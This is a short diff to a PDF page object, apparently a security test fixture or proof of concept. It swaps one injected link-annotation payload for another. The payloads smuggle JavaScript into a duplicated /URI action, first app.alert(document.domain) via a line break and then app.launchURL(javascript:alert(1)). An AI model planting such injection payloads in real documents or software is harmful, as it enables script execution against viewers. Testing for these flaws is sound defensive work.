@@ -6,7 +6,7 @@
 /Resources 2 0 R
 /MediaBox [0 0 595.2799999999999727 841.8899999999999864]
 /Annots [
-<</Type /Annot /Subtype /Link /Rect [0. 813.5435433070865656 566.9291338582677326 246.614409448818833] /Border [0 0 0] /A <</S /URI /URI (/blah)>>/A<</S/URI/URI(\r\napp.alert(document.domain))/Type/Action>>/F 0>>() >> >>
+<</Type /Annot /Subtype /Link /Rect [0. 813.5435433070865656 566.9291338582677326 246.614409448818833] /Border [0 0 0] /A <</S /URI /URI (/blah)>>/A<</S/URI/URI('app.launchURL(javascript:alert(1)')/Type/Action>>/F 0>>() >> >>
 ]
 /Contents 4 0 R
 >>
